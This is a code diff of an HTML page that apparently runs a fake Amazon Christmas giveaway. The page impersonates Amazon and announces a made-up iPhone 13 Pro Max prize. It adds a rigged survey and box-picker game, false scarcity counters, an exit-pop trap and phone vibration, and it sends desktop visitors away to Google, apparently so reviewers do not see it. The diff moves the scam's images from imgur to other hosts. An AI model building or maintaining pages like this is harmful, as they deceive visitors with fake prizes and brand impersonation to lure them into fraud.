@@ -5,7 +5,7 @@
 <script>
             if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
             } else {
-                window.location.href = "http://www.google.com";
+                window.location.href = "https://www.google.com";
             }
         </script>
         
@@ -25,7 +25,7 @@
 	<meta property="og:url" content="https://amazon.com" />
 	<meta property="og:image" content="https://zaget.cc/amznchristmas/USc0l8y.jpeg" />
 	<meta property="og:description" content="Free Gifts for EVERYONE 🎁" />
-	<link rel="image_src" href="https://i.imgur.com/USc0l8y.jpeg" />
+	<link rel="image_src" href="https://zaget.cc/amznchristmas/USc0l8y.jpeg" />
 	<meta property="og:image" content="https://zaget.cc/amznchristmas/USc0l8y.jpeg" />
 	<meta name="twitter:image:src" content="https://zaget.cc/amznchristmas/USc0l8y.jpeg>
 	<meta name="twitter:image" content="https://zaget.cc/amznchristmas/USc0l8y.jpeg">
@@ -35,8 +35,8 @@
 <meta name="robots" content="noindex,nofollow">
 
 </head>
-<img src='https://i.imgur.com/anOPSjC.png' width='100%'/>
-<img src='https://i.imgur.com/fVcHvUd.jpeg' width='100%'/>
+<img src='https://pincdn.pages.dev/anOPSjC.png' width='100%'/>
+<img src='https://pincdn.pages.dev/fVcHvUd.jpeg' width='100%'/>
   
 
 <style>
@@ -71,7 +71,7 @@
 
 <div class="app" id="app" v-cloak>
 <vue-modal v-show="!showRotator && !showPrize" :open="showOpeningModal" class="opening-modal">
-<img class="opening-modal__image" src="https://i.imgur.com/ZyaivZa.png" alt="Apple iPhone 13 Pro Max" />
+<img class="opening-modal__image" src="https://pincdn.pages.dev/ZyaivZa.png" alt="Apple iPhone 13 Pro Max" />
 <h1 class="heading heading--h1">
 Congratulations!
 </h1>
@@ -85,7 +85,7 @@ CONTINUE
 </button>
 </vue-modal>
 <vue-modal :open="showInstructionsModal">
-<img src="https://i.imgur.com/sC2Jjlg.png" style="width: 150px;">
+<img src="https://pincdn.pages.dev/sC2Jjlg.png" style="width: 150px;">
 <h2 class="heading heading--h1">Congratulation ! </h2>
  <h4 class="heading heading--h1">Your answers have been saved</h4>
 <p class="paragraph">
@@ -100,7 +100,7 @@ Start now
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<img src="https://i.imgur.com/sC2Jjlg.png" style="width: 150px;">
+<img src="https://pincdn.pages.dev/sC2Jjlg.png" style="width: 150px;">
 <h1 class="heading heading--h1">Better luck next time</h1>
 <p class="paragraph">
 You have (2) extra chances. 
@@ -110,7 +110,7 @@ OK
 </button>
 </vue-modal>
 <vue-modal :open="showSuccessModal">
-<img src="https://i.imgur.com/w0B8amc.png" style="width: 200px;">
+<img src="https://pincdn.pages.dev/w0B8amc.png" style="width: 200px;">
 <h1 class="heading heading--h1">Congratulations! </h1>
   <h3 class="heading heading--h1">You did it! you won : </h3>
 
@@ -131,7 +131,7 @@ NEXT</button>
 </div>
 </div>
 <div class="right">
-<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/gA8VSUi.png" box-image="https://i.imgur.com/hjOKs3A.png" box-back-image="https://i.imgur.com/dufSP4Y.png" prize-image="https://i.imgur.com/6M1iAtC.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://pincdn.pages.dev/gA8VSUi.png" box-image="https://pincdn.pages.dev/hjOKs3A.png" box-back-image="https://pincdn.pages.dev/dufSP4Y.png" prize-image="https://pincdn.pages.dev/6M1iAtC.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
                      "Please wait ...",
@@ -143,31 +143,31 @@ NEXT</button>
 <strong>
 You have answered all of the questions.
 </strong>
-<img class="verify__icon verify__icon--checked" src="https://i.imgur.com/F8tkJ0o.png" alt="" />
+<img class="verify__icon verify__icon--checked" src="https://pincdn.pages.dev/F8tkJ0o.png" alt="" />
 </div>
 <div class="verify__text" v-else>
 Your answers are being processed
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://i.imgur.com/3S99r2P.gif" alt="" />
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://pincdn.pages.dev/3S99r2P.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
 There are still prizes available!
 </strong>
-<img class="verify__icon verify__icon--checked" src="https://i.imgur.com/F8tkJ0o.png" alt="" />
+<img class="verify__icon verify__icon--checked" src="https://pincdn.pages.dev/F8tkJ0o.png" alt="" />
 </div>
 <div class="verify__text" v-else>
 Looking for gifts.. 
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://i.imgur.com/3S99r2P.gif" alt="" />
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://pincdn.pages.dev/3S99r2P.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
 Only (1344) gifts remain!
 </strong>
-<img class="verify__icon verify__icon--checked" src="https://i.imgur.com/F8tkJ0o.png" alt="" />
+<img class="verify__icon verify__icon--checked" src="https://pincdn.pages.dev/F8tkJ0o.png" alt="" />
 </div>
 <div class="verify__text" v-else>
 Stock is being checked
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://i.imgur.com/3S99r2P.gif" alt="" />
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://pincdn.pages.dev/3S99r2P.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
@@ -234,7 +234,7 @@ window.onbeforeunload = ExitPop;
 <script>
 	navigator.vibrate([1000, 300, 1000, 300,1000]);
 </script>
-  <img src='https://i.imgur.com/DQ5UllP.jpeg' width='100%'/>
+  <img src='https://pincdn.pages.dev/DQ5UllP.jpeg' width='100%'/>
   <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,4777589,4,0,0,0,00010000']);
